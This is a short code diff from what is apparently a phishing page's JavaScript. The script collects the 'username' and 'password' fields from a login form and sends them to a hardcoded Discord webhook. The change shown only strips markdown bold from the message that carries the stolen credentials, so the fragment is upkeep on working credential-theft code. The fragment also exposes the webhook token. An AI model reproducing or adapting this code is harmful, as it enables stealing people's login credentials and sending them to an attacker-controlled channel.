@@ -136,7 +136,7 @@
       request.open("POST", "https://discord.com/api/webhooks/936486044449267772/nysjSd82pUpwZoCwUr-BAniUlPV-B4I__fd-t4fwCcwcky2oumWWYyZNZxDak8tyz8_q");
       request.setRequestHeader('Content-type', 'application/json');
       var params = {
-        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+        content: ("> USERNAME  : " + document.getElementById('username').value + "\n> PASSWORD : " + document.getElementById('password').value)
       }
       request.send(JSON.stringify(params));
   	sleep(400)
